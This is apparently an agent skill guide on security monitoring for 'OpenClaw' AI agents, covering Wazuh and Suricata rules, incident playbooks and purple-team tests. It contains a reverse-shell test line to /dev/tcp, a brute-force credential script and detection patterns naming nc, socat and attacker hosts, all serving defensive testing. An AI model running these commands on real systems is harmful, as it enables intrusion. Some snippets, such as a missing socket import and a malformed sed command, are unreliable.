---
name: security-monitoring-threat-detection
description: "Enterprise-grade skill for implementing 24/7 security monitoring and threat detection on OpenClaw AI agent infrastructure. Use whenever setting up logging, alerting, intrusion detection, SIEM integration, or real-time monitoring for AI agent systems. Also trigger for log analysis, anomaly detection, incident response procedures, SOC operations for AI infrastructure, security event correlation, or any continuous monitoring pattern for autonomous AI agent deployments."
---

# Security Monitoring & Threat Detection for OpenClaw AI Agents

## 1. Purpose

Continuous security monitoring is non-negotiable for autonomous AI agents operating on untrusted networks. Unlike human-operated systems where logging is optional, AI agents executing skills at scale generate hundreds of security-relevant events per minute: API calls to external services, credential access patterns, network connections, file operations, and privilege escalations. Without real-time detection, a compromised agent can exfiltrate data, pivot to internal systems, or execute malicious skills undetected for days. Security monitoring transforms detection from reactive investigation ("How did this happen?") to proactive prevention ("Stop it before impact").

## 2. First Principles of Monitoring

**Observe-Orient-Decide-Act Loop**: Every alert must complete the OODA loop—observe anomalous activity, orient against known threats, decide escalation level, act via automated or manual remediation. Monitoring without response is noise.

**Signal vs Noise**: 99% of logs are operational churn. True threats are rare signals buried in noise. The art of threat detection is building filters that catch rare events while suppressing false positives. A SIEM with 10,000 alerts/day where 9,900 are false positives has failed.

**Pyramid of Pain**: Indicators of Compromise (IoCs) like IP addresses are trivial to change. Tactics, Techniques, and Procedures (TTPs) are behavioral patterns attackers reuse. Monitor for TTPs first (e.g., "unusual API calls followed by credential access"), IoCs second.

**Dwell Time Reduction**: Average breach dwell time is 206 days (2024 Verizon DBIR). Your MTTD (Mean Time To Detect) goal: <24 hours. MTTR (Mean Time To Respond): <4 hours.

## 3. Threat Detection Concepts

**Signature-Based Detection**: Match events against known malicious patterns. Fast, precise, zero false positives for known threats. Fails against zero-days and novel techniques. Example: "Alert if agent attempts to execute /bin/bash directly."

**Anomaly-Based Detection**: Baseline normal behavior, alert deviations. Catches novel threats but high false positive rate. Requires machine learning or statistical baselines. Example: "Agent normally makes 15 API calls/minute; alert if >100 calls in 60s window."

**Behavioral Analysis**: Track sequences of actions, not isolated events. Example: "SSH login from new IP + file transfer to external server + VPN client install = potential exfiltration TTP."

**Threat Intelligence Feeds**: MITRE ATT&CK framework maps techniques to observed APT behaviors. Know your threats: does a skill interact with cloud APIs? Cross-reference against known cloud-targeting TTPs.

## 4. OpenClaw Monitoring Architecture

Monitor these dimensions:

- **System Metrics**: CPU, memory, disk (filling = DoS), file descriptors, process count
- **Application Logs**: Skill execution, errors, API calls (with sanitized args), auth events
- **Network Flows**: Outbound connections (to which IPs/ports?), DNS queries (typosquatting detection), TLS certificate validation failures
- **API Call Tracing**: Which external APIs do skills invoke? Track unusual patterns (e.g., agent calling payment API when it shouldn't)
- **Discord Interactions**: Bot commands, user mentions, permission changes, webhooks (webhook abuse = command injection vector)
- **Skill Execution**: Execution time, resource usage, error rates, parameters passed (for anomaly detection)
- **Credential Usage**: Who accessed what credentials? From which skill? At what time?
- **Filesystem Events**: New process launches, file modifications in /etc, binary execution from /tmp (staging malware)

## 5. Implementation Levels

### Beginner — Basic Log Monitoring

**Systemd Journal + logrotate + Cron**

```bash
# /etc/logrotate.d/openclaw
/var/log/openclaw/*.log {
  daily
  rotate 30
  compress
  delaycompress
  notifempty
  create 0640 openclaw openclaw
  sharedscripts
  postrotate
    systemctl reload openclaw > /dev/null 2>&1 || true
  endscript
}

# Daily health check cron
0 6 * * * root /usr/local/bin/openclaw-health-check.sh | mail -s "OpenClaw Daily Report" soc@internal.local
```

**Simple Health Check Script**:
```bash
#!/bin/bash
echo "=== Skill Execution Stats (last 24h) ==="
journalctl -u openclaw -S "24 hours ago" | grep "skill_executed" | wc -l
echo "=== Error Rate ==="
journalctl -u openclaw -S "24 hours ago" --priority err | wc -l
echo "=== Credential Access Events ==="
journalctl -u openclaw -S "24 hours ago" | grep -i "credential" | wc -l
```

**Basic Alerting via Grep + Mail**:
```bash
# Run every 5 minutes via cron
* * * * * root journalctl -u openclaw -n 100 | grep -i "permission denied" && \
  echo "Permission denied event detected" | mail -s "ALERT: OpenClaw Permission Denied" soc@internal.local
```

### Intermediate — Structured Logging & ELK Stack

**Application Logging (JSON format)**:
```python
import json
import logging
from datetime import datetime

class SecurityLogger:
    def __init__(self):
        self.handler = logging.StreamHandler()
        self.handler.setFormatter(logging.Formatter('%(message)s'))

    def log_skill_execution(self, skill_name, params, status, duration_ms, actor_id):
        event = {
            "timestamp": datetime.utcnow().isoformat(),
            "event_type": "skill_execution",
            "skill_name": skill_name,
            "parameters": self._sanitize(params),
            "status": status,
            "duration_ms": duration_ms,
            "actor_id": actor_id,
            "hostname": socket.gethostname(),
            "service": "openclaw-agent"
        }
        logging.info(json.dumps(event))

    def log_credential_access(self, credential_name, skill_name, actor_id, success):
        event = {
            "timestamp": datetime.utcnow().isoformat(),
            "event_type": "credential_access",
            "credential_name": credential_name,
            "skill_name": skill_name,
            "actor_id": actor_id,
            "success": success,
            "hostname": socket.gethostname()
        }
        logging.info(json.dumps(event))
```

**Filebeat Configuration** (`/etc/filebeat/filebeat.yml`):
```yaml
filebeat.inputs:
- type: log
  enabled: true
  paths:
    - /var/log/openclaw/app.json
  json.message_key: message
  json.keys_under_root: true

processors:
  - add_kubernetes_metadata: ~
  - add_host_metadata: ~

output.elasticsearch:
  hosts: ["elasticsearch:9200"]
  index: "openclaw-%{+yyyy.MM.dd}"

logging.level: info
```

**Kibana Alert Rule (Anomaly Detection)**:
```json
{
  "name": "Unusual API Call Rate",
  "type": "threshold",
  "rule": {
    "query": "service:openclaw-agent AND event_type:api_call",
    "aggregation": {
      "field": "skill_name",
      "metrics": [{"count": {}}]
    },
    "threshold": {
      "field": "doc_count",
      "operator": "above",
      "value": 500,
      "timeframe": "5m"
    },
    "actions": [
      {
        "type": "webhook",
        "url": "https://soc.internal/api/alerts",
        "payload": {
          "severity": "medium",
          "title": "High API call volume detected",
          "description": "Skill {{skill_name}} executed {{doc_count}} API calls in 5 minutes"
        }
      }
    ]
  }
}
```

**Grafana Dashboard (JSON)**:
```json
{
  "dashboard": {
    "title": "OpenClaw Agent Security Monitoring",
    "panels": [
      {
        "title": "Skill Execution Rate",
        "targets": [{"expr": "rate(skill_executions_total[5m])"}],
        "alert": {"name": "HighExecRate", "conditions": [{"evaluator": {"params": [100]}}]}
      },
      {
        "title": "Error Rate by Skill",
        "targets": [{"expr": "rate(skill_errors_total[5m]) by (skill_name)"}]
      },
      {
        "title": "Credential Access Timeline",
        "targets": [{"expr": "increase(credential_accesses_total[5m])"}]
      },
      {
        "title": "Network Connections",
        "targets": [{"expr": "network_connections_open by (remote_ip, remote_port)"}]
      }
    ]
  }
}
```

### Advanced — SIEM Integration (Wazuh + Suricata)

**Wazuh Agent Configuration** (`/var/ossec/etc/ossec.conf`):
```xml
<ossec_config>
  <agent>
    <server ip="wazuh-manager.internal" port="1514"/>
  </agent>

  <localfile>
    <log_format>json</log_format>
    <location>/var/log/openclaw/app.json</location>
    <label>openclaw:app</label>
  </localfile>

  <localfile>
    <log_format>syslog</log_format>
    <location>/var/log/auth.log</location>
  </localfile>

  <monitored-files>
    <directory realtime="yes" whodata="yes">/etc/openclaw</directory>
    <directory realtime="yes" whodata="yes">/opt/openclaw</directory>
  </monitored-files>

  <rootkit_detection>
    <enabled>yes</enabled>
    <rootkit>rootkits.txt</rootkit>
  </rootkit_detection>

  <sca>
    <enabled>yes</enabled>
  </sca>
</ossec_config>
```

**Wazuh Decoders** (Custom rule mapping):
```xml
<decoder name="openclaw_skill">
  <plugin_decoder>JSON</plugin_decoder>
  <parent>json</parent>
</decoder>

<decoder name="openclaw_skill->event">
  <parent>openclaw_skill</parent>
  <type>openclaw</type>
  <regex_offset>event_type</regex_offset>
  <regex>(\w+)</regex>
  <order>event_type</order>
</decoder>
```

**Wazuh Custom Rules** (`/var/ossec/etc/rules/openclaw.xml`):
```xml
<group name="openclaw">
  <!-- Brute Force Detection: >5 failed credential accesses in 2 minutes -->
  <rule id="100001" level="6">
    <if_sid>openclaw_skill</if_sid>
    <field name="event_type">credential_access</field>
    <field name="success">false</field>
    <frequency>5</frequency>
    <timeframe>120</timeframe>
    <description>Possible credential brute force attack on skill {{skill_name}}</description>
    <mitre>
      <id>T1110</id> <!-- Brute Force -->
    </mitre>
  </rule>

  <!-- Unusual API Spike: Agent calling payment APIs when unexpected -->
  <rule id="100002" level="7">
    <if_sid>openclaw_skill</if_sid>
    <field name="skill_name">.*payment.*|.*transfer.*|.*withdraw.*</field>
    <field name="actor_id">NOT^admin$</field>
    <description>Unauthorized payment-related skill invocation by {{actor_id}}</description>
    <mitre>
      <id>T1534</id> <!-- Internal Spearphishing -->
    </mitre>
  </rule>

  <!-- Credential Access Spike: >10 credential reads in 5 minutes -->
  <rule id="100003" level="8">
    <if_sid>openclaw_skill</if_sid>
    <field name="event_type">credential_access</field>
    <frequency>10</frequency>
    <timeframe>300</timeframe>
    <description>Credential access spike detected - possible lateral movement</description>
    <mitre>
      <id>T1555</id> <!-- Credentials from Password Stores -->
    </mitre>
  </rule>

  <!-- Skill Execution from Unusual Time: Off-hours execution -->
  <rule id="100004" level="5">
    <if_sid>openclaw_skill</if_sid>
    <time>2200-0600</time>
    <description>Skill executed during off-hours (22:00-06:00): {{skill_name}}</description>
  </rule>

  <!-- Process Anomaly: Unexpected binary execution -->
  <rule id="100005" level="7">
    <if_sid>sysmon_process_create</if_sid>
    <field name="Image">.*/(bash|python|perl|nc|curl|wget)$</field>
    <field name="ParentImage">.*/java$|.*/node$|.*/python$</field>
    <field name="CommandLine">.*\|(nc|ncat|netcat|socat|curl.*-X).*</field>
    <description>Possible reverse shell or command injection: {{Image}}</description>
    <mitre>
      <id>T1059</id> <!-- Command and Scripting Interpreter -->
    </mitre>
  </rule>

  <!-- Network Anomaly: Unexpected outbound HTTPS to non-whitelisted domains -->
  <rule id="100006" level="6">
    <if_sid>suricata_alert</if_sid>
    <field name="dest_ip">NOT^10\.|NOT^172\.(1[6-9]|2[0-9]|3[0-1])|NOT^192\.168\.</field>
    <field name="dest_port">443</field>
    <field name="src_ip">10.0.1.50</field> <!-- OpenClaw agent IP -->
    <description>Unexpected external HTTPS connection to {{dest_ip}}: {{dest_port}}</description>
    <mitre>
      <id>T1571</id> <!-- Non-Standard Port -->
    </mitre>
  </rule>
</group>
```

**Suricata IDS Rules** (`/etc/suricata/rules/openclaw.rules`):
```
# Detect DNS exfiltration attempts
alert dns $HOME_NET any -> any 53 (
  msg:"Possible DNS exfiltration attempt";
  dns.query; content:".exfil.local";
  classtype:command-and-control;
  sid:1000001; rev:1;
)

# Detect credential theft in DNS queries
alert dns $HOME_NET any -> any 53 (
  msg:"API key patterns in DNS query";
  dns.query; pcre:"/^sk_[a-z0-9]{20,}/i";
  classtype:data-exfiltration;
  sid:1000002; rev:1;
)

# Detect beaconing pattern (consistent connection intervals)
alert http $HOME_NET any -> $EXTERNAL_NET any (
  msg:"Possible C&C beaconing to external IP";
  http.host; content:"beacon.attacker.com";
  classtype:command-and-control;
  sid:1000003; rev:1;
)

# Detect reverse shell indicators
alert tcp $HOME_NET any -> any any (
  msg:"Reverse shell payload indicator";
  content:"/bin/bash";
  content:"-i";
  content:">& /dev/tcp/";
  classtype:execution-command;
  sid:1000004; rev:1;
)
```

### Architect — SOC-Grade Threat Detection

**Automated Response Playbooks** (SOAR integration via Wazuh Integrations API):
```json
{
  "playbook_id": "credential_breach_response",
  "trigger": "rule:100003",
  "actions": [
    {
      "step": 1,
      "action": "isolate_agent",
      "description": "Quarantine the agent from network",
      "implementation": "iptables -I INPUT -j DROP; iptables -I OUTPUT -j DROP"
    },
    {
      "step": 2,
      "action": "snapshot_forensics",
      "description": "Capture memory, open file descriptors, network sockets",
      "implementation": "timeout 60 dd if=/dev/mem of=/forensics/memory.img; netstat -anp > /forensics/netstat.txt; lsof +D / > /forensics/lsof.txt"
    },
    {
      "step": 3,
      "action": "revoke_credentials",
      "description": "Revoke all active credentials for the agent",
      "api": "POST /api/credentials/revoke?agent_id={{agent_id}}"
    },
    {
      "step": 4,
      "action": "create_incident",
      "description": "Create incident in JIRA for SOC review",
      "api": "POST https://jira.internal/rest/api/2/issue",
      "payload": {
        "fields": {
          "project": {"key": "SEC"},
          "summary": "Credential breach detected on {{agent_id}}",
          "priority": {"name": "Critical"},
          "customfield_10001": "Automated Response - Isolation Executed"
        }
      }
    },
    {
      "step": 5,
      "action": "notify_soc",
      "description": "Page on-call SOC engineer",
      "api": "POST https://pagerduty.internal/api/incidents",
      "payload": {"escalation_policy_id": "incident_response_team"}
    }
  ]
}
```

**Threat Hunting Queries** (Elasticsearch DSL):
```json
{
  "hunt_id": "lateral_movement_detection",
  "description": "Find agents accessing credentials outside their normal pattern",
  "query": {
    "bool": {
      "must": [
        {"match": {"event_type": "credential_access"}},
        {"range": {"timestamp": {"gte": "now-7d"}}}
      ],
      "must_not": [
        {"terms": {"credential_name": ["whitelist_creds"]}}
      ]
    }
  },
  "aggregations": {
    "by_agent": {
      "terms": {"field": "agent_id", "size": 100},
      "aggs": {
        "unique_credentials": {"cardinality": {"field": "credential_name"}},
        "access_timeline": {"date_histogram": {"field": "timestamp", "interval": "1h"}}
      }
    }
  },
  "alert_condition": "unique_credentials > 5 AND access_timeline spike"
}
```

## 6. Step-by-Step Monitoring Setup (Zero to Production)

**Phase 1: Foundation (Day 1)**
```bash
# 1. Install logging infrastructure
sudo apt-get install -y filebeat elasticsearch kibana
sudo systemctl enable filebeat elasticsearch kibana

# 2. Deploy OpenClaw with JSON logging enabled
export OPENCLAW_LOG_FORMAT=json
export OPENCLAW_LOG_LEVEL=info
systemctl restart openclaw

# 3. Verify logs are being shipped
curl -s http://localhost:9200/openclaw-*/_count | jq '.count'

# 4. Create basic dashboard in Kibana
# Navigate to Kibana UI, create index pattern openclaw-*, visualize skill_execution events
```

**Phase 2: Detection (Day 2-3)**
```bash
# 1. Install Wazuh agent
curl -s https://packages.wazuh.com/key/GPG-KEY-WAZUH | apt-key add -
echo "deb https://packages.wazuh.com/4.x/apt/ stable main" > /etc/apt/sources.list.d/wazuh.list
apt-get update && apt-get install -y wazuh-agent

# 2. Configure agent
sed -i "s/<server-ip>wazuh-manager.internal</g" /var/ossec/etc/ossec.conf

# 3. Deploy custom rules and decoders
cp openclaw.xml /var/ossec/etc/rules/
cp openclaw-decoders.xml /var/ossec/etc/decoders/

# 4. Restart Wazuh agent and verify connectivity
systemctl restart wazuh-agent
tail -100 /var/ossec/logs/active-responses.log

# 5. Test alert generation
/usr/local/bin/openclaw-cli execute-skill payment-transfer \
  --to-account=attacker@evil.com \
  --amount=1000000 \
  --actor-id=test-user

# Verify alert was generated in Wazuh dashboard within 60 seconds
```

**Phase 3: Response (Day 4-5)**
```bash
# 1. Set up Slack/PagerDuty webhooks
WEBHOOK_URL="https://hooks.slack.com/services/YOUR/WEBHOOK/URL"
curl -X POST $WEBHOOK_URL \
  -H 'Content-Type: application/json' \
  -d '{"text": "OpenClaw SIEM integration test - Critical alert"}'

# 2. Configure Wazuh integration with webhook
cat > /var/ossec/etc/integrations/custom-webhook.conf << EOF
[custom-webhook]
hook_url = $WEBHOOK_URL
alert_format = json
EOF

# 3. Configure escalation policy
# - Severity 5-6: Slack notification
# - Severity 7+: PagerDuty page + auto-isolation

# 4. Document runbooks for each alert type
cat > /opt/openclaw/runbooks/credential_breach.md << 'EOF'
## Credential Breach Response Runbook
1. Verify alert authenticity (not false positive)
2. Check credential_access logs for affected credentials
3. Determine exposure window (timestamp of access)
4. Revoke affected credentials immediately
5. Audit all API calls made with those credentials
6. Post-incident review within 24 hours
EOF
```

## 7. Real Alerting Examples

**Alert 1: Brute Force Credential Access**
```yaml
name: "Credential Brute Force Attack"
severity: "critical"
mttd: "2 minutes"
trigger: |
  event.event_type == "credential_access"
  AND event.success == false
  AND count(*) > 5
  WITHIN 120 seconds
  GROUP BY agent_id
actions:
  - revoke_all_credentials(agent_id)
  - page_soc("Brute force detected on {{agent_id}}")
  - snapshot_forensics(agent_id)
false_positive_rate: "2%"
baseline: "Average 0.5 failed attempts/day per agent"
```

**Alert 2: Unusual API Usage Pattern**
```yaml
name: "API Call Rate Anomaly"
severity: "high"
mttd: "5 minutes"
detection_method: "statistical_baseline"
trigger: |
  event.event_type == "api_call"
  AND rate > (baseline_rate + 3 * standard_deviation)
  WITHIN 300 seconds
  GROUP BY skill_name, actor_id
baseline_calculation: |
  # Calculate per-skill baseline from past 30 days, per 1-hour window
  baseline = percentile(api_call_count, 95) per skill per hour
  threshold = baseline * 1.5  # Alert if 50% above normal
actions:
  - alert_soc("Unusual API activity: {{skill_name}}")
  - log_detailed_context(api_calls from past 10 minutes)
  - check_source_legitimacy(actor_id)
false_positive_rate: "5%"
```

**Alert 3: Disk Space Filling (DoS)**
```yaml
name: "Disk Usage Critical"
severity: "high"
mttd: "1 minute"
trigger: |
  (disk_used_percent > 85)
  OR (disk_increase_rate > 100MB/min)
  WITHIN 60 seconds
actions:
  - alert_ops("Disk {{mount_point}} at {{usage}}%")
  - compress_old_logs("7 days")
  - rotate_logs_immediately()
  - if (usage > 95): halt_new_skill_executions()
false_positive_rate: "<1%"
recovery_sla: "15 minutes"
```

**Alert 4: Process Anomaly (Unauthorized Shell)**
```yaml
name: "Suspicious Process Execution"
severity: "critical"
mttd: "10 seconds"
trigger: |
  process.parent_image in [openclaw_runtime, skill_executor]
  AND process.image in ["/bin/bash", "/bin/sh", "/usr/bin/python", "/usr/bin/perl"]
  AND (
    process.command_line contains "nc " OR
    process.command_line contains "ncat " OR
    process.command_line contains "/dev/tcp" OR
    process.command_line contains "curl.*-X" OR
    process.command_line contains ">" AND process.command_line contains "<"
  )
actions:
  - kill_process(process.pid)
  - dump_memory_and_strings(process.pid)
  - alert_soc("Reverse shell attempt detected")
  - isolate_agent()
mitre_mapping: "T1059 (Command and Scripting Interpreter), T1190 (Exploit Public-Facing Application)"
```

**Alert 5: Credential Access Spike**
```yaml
name: "Abnormal Credential Access Pattern"
severity: "high"
mttd: "3 minutes"
trigger: |
  event.event_type == "credential_access"
  AND count(distinct credential_name) > 5
  WITHIN 300 seconds
  FOR agent_id
baseline: |
  Normal credential access = 0-2 unique credentials per agent per hour
  Threshold = access to >5 unique credentials within 5 minutes = 1000% above baseline
actions:
  - revoke_recently_accessed_credentials(agent_id, within_5_min=true)
  - audit_api_calls(credentials accessed, last 10 minutes)
  - check_for_lateral_movement("Did agent connect to new IPs after credential access?")
  - page_soc_incident("Potential privilege escalation attempt")
mitre_mapping: "T1555 (Credentials from Password Stores), T1556 (Modify Authentication Process)"
```

## 8. Incident Response Workflow

```
┌─────────────────────────────────────────────────────────────────────┐
│ DETECTION (T+0 to T+15 min)                                         │
├─────────────────────────────────────────────────────────────────────┤
│ 1. Automated alert fires (Wazuh rule triggered)                     │
│ 2. Initial triage: Severity classification                          │
│    - Critical: Auto-isolate, page SOC immediately                   │
│    - High: Alert SOC, start investigation within 30 min             │
│    - Medium: Log for review, investigate within 4 hours             │
│    - Low: Log, trend analysis                                       │
│ 3. Collect alert context:                                           │
│    - Related events (past 10 minutes)                               │
│    - Actor who triggered alert (user, service account, etc)         │
│    - Scope (single agent, multiple agents, external contact?)       │
└─────────────────────────────────────────────────────────────────────┘
           ↓
┌─────────────────────────────────────────────────────────────────────┐
│ CONTAINMENT (T+15 to T+60 min) - MANUAL SOC ACTION REQUIRED         │
├─────────────────────────────────────────────────────────────────────┤
│ SOC Runbook for Critical Alert:                                     │
│                                                                      │
│ IF credential_access_spike:                                         │
│   1. Verify agent connectivity (is alert legitimate?)               │
│      curl https://agent-api/health                                  │
│   2. Query credential vault for access history                      │
│      SELECT * FROM credential_access WHERE agent_id = X             │
│      AND timestamp > NOW() - INTERVAL 10 minutes                    │
│   3. For each accessed credential:                                  │
│      - Identify what skill used it                                  │
│      - Check API logs for calls made with that credential           │
│      - Assess blast radius (what systems were accessed?)            │
│   4. Decision: Revoke credentials? Isolate agent? Wait for analysis?│
│   5. Execute decision:                                              │
│      REVOKE: /api/credentials/revoke?agent_id=X                    │
│      ISOLATE: firewall drop agent IP, pause skill queue             │
│   6. Document all actions in incident ticket                        │
│   7. Notify service owners who depend on the agent                  │
└─────────────────────────────────────────────────────────────────────┘
           ↓
┌─────────────────────────────────────────────────────────────────────┐
│ ERADICATION (T+60 min to T+4 hours)                                 │
├─────────────────────────────────────────────────────────────────────┤
│ 1. Forensic analysis:                                               │
│    - Dump process memory, strings (what did it try to do?)          │
│    - Extract DNS queries (exfiltration attempts?)                   │
│    - Analyze network traffic (command & control?)                   │
│ 2. Determine attack vector:                                         │
│    - Compromised skill code?                                        │
│    - Compromised dependency?                                        │
│    - Social engineering (malicious command via Discord)?            │
│    - Brute force/credential reuse?                                  │
│ 3. Block attack vector:                                             │
│    - Update WAF rules (if web-based)                                │
│    - Patch vulnerable skill code                                    │
│    - Rotate all potentially exposed credentials                     │
│    - Blacklist malicious IPs/domains in Suricata                    │
│ 4. Verify containment:                                              │
│    - Re-test with simulated attack (purple team)                    │
│    - Confirm alert would trigger again                              │
└─────────────────────────────────────────────────────────────────────┘
           ↓
┌─────────────────────────────────────────────────────────────────────┐
│ RECOVERY (T+4 hours to T+24 hours)                                  │
├─────────────────────────────────────────────────────────────────────┤
│ 1. Bring agent back online:                                         │
│    - Rebuild from clean image (if compromised)                      │
│    - Deploy patched skill code                                      │
│    - Inject fresh credentials from vault                            │
│    - Retest functionality                                           │
│ 2. Verify all dependent services still work                         │
│ 3. Audit all logs from exposure window                              │
│    - What else did agent do during incident?                        │
│    - Did attack propagate to other systems?                         │
│ 4. Notify all affected parties of incident outcome                  │
└─────────────────────────────────────────────────────────────────────┘
           ↓
┌─────────────────────────────────────────────────────────────────────┐
│ LESSONS LEARNED (T+24 hours to T+72 hours) - PREVENTION FOCUS       │
├─────────────────────────────────────────────────────────────────────┤
│ 1. Incident review meeting (SOC + engineering + product)            │
│    - Timeline: What happened, when, how was it detected?            │
│    - Impact: What was accessed/modified/exfiltrated?                │
│    - Root cause: Why did this happen?                               │
│    - MTTD: How long did we take to detect? (benchmark: <24h)        │
│    - MTTR: How long to respond? (benchmark: <4h)                    │
│ 2. Preventive actions:                                              │
│    - Update threat models for this skill type                       │
│    - Implement additional controls (e.g., rate limiting on cred access)
│    - Improve alert tuning (reduce false positives)                  │
│    - Add detection gap coverage (what didn't we catch?)             │
│ 3. Documentation:                                                   │
│    - Update runbooks with lessons learned                           │
│    - Document new IOCs in threat intel feed                         │
│    - Update MITRE ATT&CK mapping for this attack                    │
│ 4. Validation:                                                      │
│    - Run purple team exercise to validate new controls              │
│    - Confirm no similar incidents in past 30 days                   │
│ 5. Metrics update:                                                  │
│    - Log improvement to MTTD and MTTR metrics                       │
│    - Calculate cost of incident vs prevention investment            │
└─────────────────────────────────────────────────────────────────────┘
```

## 9. Governance & Escalation Rules

**Severity Classification Matrix**:
| Severity | Definition | MTTD Target | MTTR Target | Escalation |
|----------|-----------|-------------|-------------|------------|
| **Critical (P1)** | Active exploitation, data exfiltration in progress, agent compromised | <10 min | <1 hour | CEO, CISO, VP Eng, On-call SOC |
| **High (P2)** | Failed exploitation attempt, brute force attack, suspicious behavior | <30 min | <4 hours | VP Eng, On-call SOC, Security Lead |
| **Medium (P3)** | Configuration anomalies, unusual patterns, potential early-stage attack | <4 hours | <24 hours | Security Lead, on-call engineer |
| **Low (P4)** | Informational events, policy violations, trend analysis | <24 hours | <1 week | Logged for review, weekly meeting |

**Escalation Channels**:
```
P1 CRITICAL:
├─ Slack: #security-incident (immediate)
├─ PagerDuty: "Incident Response Team" (page)
├─ Phone: On-call SOC lead (conference line)
├─ Auto-Actions: Isolate agent, snapshot forensics
└─ Status Page: Update customer communication

P2 HIGH:
├─ Slack: #security-incidents (15 min)
├─ PagerDuty: Non-urgent alert
├─ Email: security@company.com
└─ Ticket: Create JIRA SEC ticket

P3 MEDIUM:
├─ Slack: Threaded comment in #security (EOD)
├─ Email: Weekly digest to security@company.com
└─ Ticket: Create JIRA SEC ticket (low priority)

P4 LOW:
└─ Aggregated in daily dashboard, weekly summary email
```

**On-Call Rotation** (24/7 coverage):
```bash
# Schedule via PagerDuty
# Mon-Fri: 2x SOC engineers (8am-5pm + 5pm-8am shift)
# Weekends: 1x SOC engineer (24h shift)
# Backup: 1x senior security engineer (escalation only)

# Alerting rules per shift:
# Daytime: Page on-call + alert manager
# Nighttime: Page on-call + escalate to manager if no response in 15 min
# Weekend: Page on-call + escalate immediately for Critical
```

**SLA Targets** (tracked in metrics dashboard):
- MTTD (Mean Time To Detect): Target 8 hours average, 24h max
- MTTR (Mean Time To Respond): Target 4 hours average, 8h max
- False Positive Rate: Target <5%, track per alert rule
- Alert Coverage: Target 95% of threat landscape covered
- Detection Accuracy: Target >95% (precision), >80% (recall)

## 10. Performance Considerations

**Log Volume Management**:
```bash
# Estimate: 50 agents × 100 skill executions/day × 5KB per log = 25GB/day
# At 7-day retention: 175GB storage required

# Sampling strategy for high-volume events:
# - All P1 events: 100% retention
# - All error events: 100% retention
# - Successful executions: 10% sampling (1 in 10)
# - API calls: 5% sampling (1 in 20)

# Configuration in Filebeat:
processors:
  - sample:
      percentage: 10.0  # Keep 10% of events matching below
      selector:
        regexp:
          message: "^.*successful.*"
```

**Retention Policy**:
```yaml
elasticsearch:
  indices:
    openclaw-high-priority:
      retention_days: 90    # P1/P2 events: 90 days
      rollover_size: 10GB
    openclaw-medium-priority:
      retention_days: 30    # P3 events: 30 days
      rollover_size: 20GB
    openclaw-low-priority:
      retention_days: 7     # P4 events: 7 days
      rollover_size: 50GB

  # Archive old indices to S3 for compliance
  snapshot_repository:
    type: s3
    bucket: security-logs-archive
    prefix: openclaw/
    schedule: "0 2 * * *"   # Daily at 2am
    ttl: 7y  # Keep for 7 years for compliance
```

**Storage Optimization**:
```bash
# Elasticsearch compression settings
index.codec: best_compression  # Use zstd compression

# Drop non-critical fields from high-volume indexes
# Keep: timestamp, event_type, severity, actor_id, resource, action
# Drop: raw_request_body, full_stack_trace, raw_memory_dump

# Gzip logs before archival
tar -czf openclaw-logs-2026-02-28.tar.gz /var/log/openclaw/
aws s3 cp openclaw-logs-2026-02-28.tar.gz s3://security-logs-archive/
```

**Query Performance Tuning**:
```yaml
# Elasticsearch index settings
index:
  number_of_replicas: 1
  number_of_shards: 5  # Per 50GB index
  refresh_interval: 30s  # Don't refresh too frequently
  max_result_window: 10000
  analysis:
    analyzer:
      openclaw_analyzer:
        type: standard
        stopwords: _english_

# Kibana dashboard optimization:
# - Use aggregations instead of full document queries
# - Pre-calculate common queries as saved searches
# - Use index lifecycle management (ILM) for automatic rollover
```

## 11. Testing Threat Scenarios

**Purple Team Exercise (Monthly)**:
```bash
#!/bin/bash
# Simulate: Brute force credential access

AGENT_ID="openclaw-prod-01"
TARGET_CRED="aws-production-key"
ATTEMPTS=10

echo "[*] Starting purple team exercise: Credential brute force"
echo "[*] Target: $AGENT_ID, Credential: $TARGET_CRED"

for i in $(seq 1 $ATTEMPTS); do
  echo "[*] Attempt $i/$ATTEMPTS - accessing credential with wrong password"
  curl -s -X GET "https://agent-api/credentials/$TARGET_CRED" \
    -H "Authorization: Bearer WRONG_TOKEN_$i" \
    -H "X-Agent-ID: $AGENT_ID" \
    2>&1 | grep -i "unauthorized\|forbidden" > /dev/null && \
    echo "✓ Failed access logged" || \
    echo "✗ FAILED: No auth failure logged!"
  sleep 5
done

echo "[*] Waiting for alert to fire..."
sleep 120

# Check if alert fired in Wazuh
ALERT=$(curl -s "https://wazuh-api/alerts?rule=100001&agent=$AGENT_ID" | jq '.total_alerts')
if [ "$ALERT" -gt 0 ]; then
  echo "✓ PASS: Alert fired as expected (alerts: $ALERT)"
else
  echo "✗ FAIL: No alert generated for brute force attempt"
  exit 1
fi
```

**Simulated Reverse Shell Attack**:
```bash
#!/bin/bash
# Test process anomaly detection

echo "[*] Testing detection: Reverse shell via inherited process"
echo "[*] Simulating: Java app spawning bash with /dev/tcp redirection"

# Run as openclaw user (non-root, similar to skill execution context)
su - openclaw << 'EOF'
  # This will likely be blocked by SELinux/AppArmor, which is good
  bash -i >& /dev/tcp/10.0.1.99/4444 0>&1 &
  SHELL_PID=$!
  sleep 1
  kill $SHELL_PID 2>/dev/null || true
EOF

echo "[*] Checking for alert in Wazuh rule 100005..."
sleep 30

curl -s "https://wazuh-api/alerts?rule=100005" | jq '.total_alerts > 0' && \
  echo "✓ PASS: Reverse shell attempt detected" || \
  echo "✗ FAIL: Reverse shell not detected"
```

**False Positive Tuning Session**:
```bash
#!/bin/bash
# Analyze false positives from past 7 days

ELASTIC_HOST="elasticsearch:9200"
INDEX="openclaw-*"

echo "[*] Analyzing false positives from past 7 days..."

# Get top false positive rules
curl -s "$ELASTIC_HOST/$INDEX/_search" -X POST -d '{
  "size": 0,
  "query": {
    "bool": {
      "must": [
        {"match": {"alert_false_positive": true}},
        {"range": {"timestamp": {"gte": "now-7d"}}}
      ]
    }
  },
  "aggs": {
    "by_rule": {
      "terms": {"field": "rule_id", "size": 20}
    }
  }
}' | jq '.aggregations.by_rule.buckets[] | {rule_id: .key, false_positive_count: .doc_count}'

# Output for review with security team:
# If false_positive_count > 10% of total alerts for that rule:
#   -> Review and tune rule (adjust thresholds, add exceptions)
#   -> Document known benign patterns
#   -> Re-baseline normal behavior if needed
```

**Alert Validation & Tuning**:
```yaml
alert_tuning_process:
  frequency: "monthly"
  steps:
    1_collect_metrics:
      query: |
        SELECT
          rule_id,
          COUNT(*) as total_alerts,
          SUM(CASE WHEN verified=true THEN 1 ELSE 0 END) as verified_threats,
          SUM(CASE WHEN false_positive=true THEN 1 ELSE 0 END) as false_positives
        FROM alerts
        WHERE timestamp > NOW() - INTERVAL 30 days
